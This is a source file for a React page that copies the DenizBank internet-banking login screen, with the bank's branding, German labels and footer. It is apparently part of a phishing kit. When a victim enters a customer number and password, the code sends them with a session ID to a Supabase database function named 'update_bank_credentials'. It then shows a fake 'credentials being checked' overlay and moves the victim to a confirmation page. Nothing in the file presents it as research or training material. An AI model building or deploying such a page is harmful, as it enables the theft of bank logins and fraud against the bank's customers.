import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ChevronDown, ChevronRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { HoverCard, HoverCardTrigger, HoverCardContent } from "@/components/ui/hover-card";

import logo from "@/assets/denizbank-logo.svg";
import bg from "@/assets/denizbank-bg.jpg";
import enbdLogo from "@/assets/enbd-logo.png";
import denizIcon from "@/assets/denizbank-icon.png";
import barrierefreiIcon from "@/assets/denizbank-barrierefrei.svg";
import sperreIcon from "@/assets/denizbank-sperreaufheben.svg";
import passwortVergessenIcon from "@/assets/denizbank-passwortvergessen.svg";
import impressumIcon from "@/assets/denizbank-impressum.svg";
import faqIcon from "@/assets/denizbank-faq.svg";
import datenschutzIcon from "@/assets/denizbank-datenschutz.svg";
import sicherheitIcon from "@/assets/denizbank-sicherheit.svg";
import gbIcon from "@/assets/denizbank-gb.svg";
import telefonIcon from "@/assets/denizbank-telefon.svg";

const Denizbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [kundennummer, setKundennummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [lang, setLang] = useState<"DE" | "EN" | "TR">("DE");
  const [activeTab, setActiveTab] = useState<"privat" | "gemein" | "firma">("privat");
  const [saveUser, setSaveUser] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("DenizBank - Internetbanking", denizIcon);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: kundennummer,
        p_password: passwort,
        p_username_label: "Kundennummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const footerLinks = [
    { icon: impressumIcon, label: "Impressum" },
    { icon: faqIcon, label: "FAQ" },
    { icon: datenschutzIcon, label: "Datenschutz" },
    { icon: sicherheitIcon, label: "Sicherheit" },
    { icon: gbIcon, label: "Geschäftsbedingungen" },
    { icon: telefonIcon, label: "0800 88 66 00" },
  ];

  const InfoBadge = () => (
    <span className="inline-flex h-5 w-5 items-center justify-center rounded-full border border-[#0073b0] text-[#0073b0] text-[11px] font-bold leading-none cursor-help">i</span>
  );

  const MaskIcon = ({ src }: { src: string }) => (
    <span
      className="h-4 w-4 bg-current inline-block"
      style={{
        WebkitMaskImage: `url(${src})`,
        maskImage: `url(${src})`,
        WebkitMaskRepeat: "no-repeat",
        maskRepeat: "no-repeat",
        WebkitMaskPosition: "center",
        maskPosition: "center",
        WebkitMaskSize: "contain",
        maskSize: "contain",
      }}
    />
  );

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen w-full bg-cover bg-center relative"
        style={{ backgroundImage: `url(${bg})`, fontFamily: "'Open Sans', sans-serif" }}
      >
        <div className="absolute inset-0 bg-black/50" />

        <div className="relative min-h-screen flex flex-col">
          {/* Header */}
          <header className="px-6 md:px-10 pt-12 pb-6">
            <div className="max-w-7xl mx-auto flex flex-col items-center gap-3 md:flex-row md:items-center md:justify-between">
              <img src={logo} alt="DenizBank" className="h-8 md:h-10" />
              <div className="flex flex-col items-center gap-3 md:flex-row md:gap-4 text-white text-sm">
                <button className="flex items-center gap-2 px-4 py-2 hover:opacity-80">
                  <img src={barrierefreiIcon} alt="" className="h-4 w-4 brightness-0 invert" />
                  Barrierefrei
                </button>
                <div className="flex items-center rounded-md border border-white/60 overflow-hidden text-sm">
                  {(["DE", "EN", "TR"] as const).map((l) => (
                    <button
                      key={l}
                      onClick={() => setLang(l)}
                      className={`px-4 py-2 transition ${lang === l ? "text-white font-semibold" : "text-white/50 hover:text-white/80"}`}
                    >
                      {l}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </header>

          {/* Content */}
          <main className="flex-1 flex items-center px-6 md:px-10 py-10">
            <div className="w-full max-w-7xl mx-auto grid md:grid-cols-2 gap-10 items-center">
              {/* Linke Seite */}
              <div className="text-white order-2 md:order-none">
                <h1 className="hidden md:block text-5xl md:text-7xl font-extrabold leading-tight text-white drop-shadow-lg relative z-10">
                  Willkommen<br />bei der DenizBank
                </h1>
                <div className="mt-2 md:mt-12 max-w-md mx-auto md:mx-0 text-center md:text-left bg-white/10 backdrop-blur-md md:bg-transparent md:backdrop-blur-none rounded-md md:rounded-none p-5 md:p-1 md:border-l-2 md:border-white/70 md:pl-5">
                  <div className="text-lg font-semibold mb-1">Hinweis</div>
                  <p className="text-sm leading-relaxed text-white/90">
                    Bitte teilen Sie Ihre persönlichen Anmeldedaten nicht mit anderen.
                  </p>
                </div>
              </div>

              {/* Login Card */}
              <div className="md:justify-self-end w-full max-w-md order-1 md:order-none">
                {/* Tabs */}
                <div className="grid grid-cols-3 text-sm">
                  {(["privat", "gemein", "firma"] as const).map((t) => {
                    const label = t === "privat" ? "Privat" : t === "gemein" ? "Gemeinschaft" : "Firma";
                    const active = activeTab === t;
                    const isPrivat = t === "privat";
                    return (
                      <button
                        key={t}
                        onClick={isPrivat ? () => setActiveTab(t) : undefined}
                        disabled={!isPrivat}
                        className={`flex items-center justify-between px-5 py-4 ${
                          active
                            ? "bg-white rounded-t-md text-[#1874ca] font-semibold text-base"
                            : "bg-[#605f60] md:bg-white/10 md:backdrop-blur-md text-white/90 cursor-default"
                        }`}
                      >
                        <span>{label}</span>
                        {active ? (
                          <ChevronDown className="hidden md:inline-block h-4 w-4 text-[#1874ca]" />
                        ) : (
                          <ChevronRight className="hidden md:inline-block h-4 w-4" />
                        )}
                      </button>
                    );
                  })}
                </div>


                {/* Card */}
                <div className="bg-white rounded-b-md p-6 space-y-4 shadow-2xl">
                  <div className="flex items-center justify-between text-sm">
                    <label className="text-[#555] font-semibold">Login (Kundennummer)</label>
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-gray-600">Benutzer speichern</span>
                      <button
                        onClick={() => setSaveUser((s) => !s)}
                        className={`relative inline-flex h-5 w-9 items-center rounded-full border transition ${saveUser ? "bg-[#1874ca] border-[#1874ca]" : "bg-white border-gray-300"}`}
                        aria-pressed={saveUser}
                      >
                        <span className={`inline-block h-4 w-4 rounded-full transition ${saveUser ? "bg-white translate-x-[18px]" : "bg-[#1874ca] translate-x-0.5"}`} />
                      </button>
                      <HoverCard openDelay={100} closeDelay={100}>
                        <HoverCardTrigger asChild>
                          <span><InfoBadge /></span>
                        </HoverCardTrigger>
                        <HoverCardContent side="bottom" align="end" className="bg-[#555]/85 backdrop-blur-sm text-white border-none text-xs leading-relaxed w-72">
                          Wenn Sie diese Checkbox aktivieren, werden die Kundennummer und Ihr Name bei der nächsten Anmeldung auf diesem Browser angezeigt. Eine Authentifizierung ist aus Sicherheitsgründen weiterhin erforderlich. Sie können die gespeicherten Anmeldedaten jederzeit wieder löschen.
                        </HoverCardContent>
                      </HoverCard>
                    </div>
                  </div>

                  <div className="relative">
                    <input
                      type="text"
                      value={kundennummer}
                      onChange={(e) => setKundennummer(e.target.value)}
                      placeholder="Kundennummer eingeben"
                      className="h-12 w-full rounded border border-gray-300 px-3 pr-10 text-sm hover:border-[#1874ca] focus:border-[#e7041f] focus:outline-none placeholder:text-[#555]"
                    />
                    <span className="absolute right-3 top-1/2 -translate-y-1/2">
                      <HoverCard openDelay={100} closeDelay={100}>
                        <HoverCardTrigger asChild>
                          <span><InfoBadge /></span>
                        </HoverCardTrigger>
                        <HoverCardContent side="top" align="end" className="bg-[#555]/85 backdrop-blur-sm text-white border-none text-xs leading-relaxed w-72">
                          Ihre Kundennummer finden Sie auf Ihrer Bankkarte.
                        </HoverCardContent>
                      </HoverCard>
                    </span>
                  </div>

                  <label className="block text-sm text-[#555] font-semibold pt-1">Passwort</label>
                  <input
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    placeholder="Passwort eingeben"
                    className="h-12 w-full rounded border border-gray-300 px-3 text-sm hover:border-[#1874ca] focus:border-[#e7041f] focus:outline-none placeholder:text-[#555]"
                  />

                  <button
                    onClick={handleSubmit}
                    className="w-full h-12 rounded text-white font-extrabold tracking-widest uppercase text-sm hover:opacity-90 transition"
                    style={{ background: "linear-gradient(90deg, #e70317 0%, #c20086 100%)" }}
                  >
                    Weiter
                  </button>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
                    <button className="group flex items-center justify-center gap-2 h-11 w-full rounded border border-[#555] text-sm text-[#555] hover:border-[#e7041f] hover:text-[#e7041f] transition-colors">
                      <MaskIcon src={sperreIcon} />
                      Sperre aufheben
                    </button>
                    <button className="group flex items-center justify-center gap-2 h-11 w-full rounded border border-[#555] text-sm text-[#555] hover:border-[#1874ca] hover:text-[#1874ca] transition-colors">
                      <MaskIcon src={passwortVergessenIcon} />
                      Passwort vergessen
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </main>

          {/* Footer */}
          <footer className="px-6 md:px-10 py-6">
            <div className="max-w-7xl mx-auto flex flex-col items-center gap-6 md:flex-row md:items-center md:justify-between">
              <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-3 text-white text-sm order-1 md:order-none md:justify-start">
                {footerLinks.map((l) => (
                  <a key={l.label} href="#" className="flex items-center gap-2 hover:opacity-80">
                    <img src={l.icon} alt="" className="h-4 w-4 brightness-0 invert" />
                    <span className="hidden md:inline">{l.label}</span>
                  </a>
                ))}
              </div>
              <div className="bg-white rounded p-1 inline-flex w-fit order-2 md:order-none">
                <img src={enbdLogo} alt="ENBD" className="h-6" />
              </div>
            </div>
          </footer>
        </div>
      </div>
    </>
  );
};

export default Denizbank;
